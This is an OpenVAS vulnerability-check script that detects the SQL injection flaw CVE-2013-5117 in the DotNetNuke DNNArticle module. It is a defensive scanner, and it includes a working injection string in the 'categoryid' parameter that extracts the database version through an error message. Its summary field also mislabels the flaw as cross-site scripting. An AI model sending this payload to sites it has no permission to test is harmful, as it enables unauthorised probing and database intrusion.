###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dotnetnuke_dnnarticle_sql_inj_vuln.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# DotNetNuke DNNArticle Module SQL Injection Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:dotnetnuke:dotnetnuke";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803868");
  script_version("$Revision: 11865 $");
  script_cve_id("CVE-2013-5117");
  script_bugtraq_id(61788);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-08-19 11:59:21 +0530 (Mon, 19 Aug 2013)");
  script_name("DotNetNuke DNNArticle Module SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_dotnetnuke_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("dotnetnuke/installed");

  script_tag(name:"summary", value:"This host is installed with DotNetNuke DNNArticle and is prone to cross site
  scripting vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check whether it is able to read the
  SQL server version or not.");
  script_tag(name:"solution", value:"Upgrade to version 10.1 or later.");
  script_tag(name:"insight", value:"Input passed via the 'categoryid' GET parameter to 'desktopmodules/
  dnnarticle/dnnarticlerss.aspx' (when 'moduleid' is set) is not properly
  sanitized before being used in a SQL query.");
  script_tag(name:"affected", value:"DotNetNuke DNNArticle module versions 10.0 and prior");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to manipulate SQL
  queries by injecting arbitrary SQL code.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/54545");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/27602");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122824");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://www.zldnn.com");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + "/DesktopModules/DNNArticle/DNNArticleRSS.aspx?"+
            "moduleid=0&categoryid=1+or+1=@@version";

if( http_vuln_check( port:port, url:url, check_header:TRUE,
    pattern:"converting the nvarchar.*Microsoft SQL Server.*([0-9.]+)" ) ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );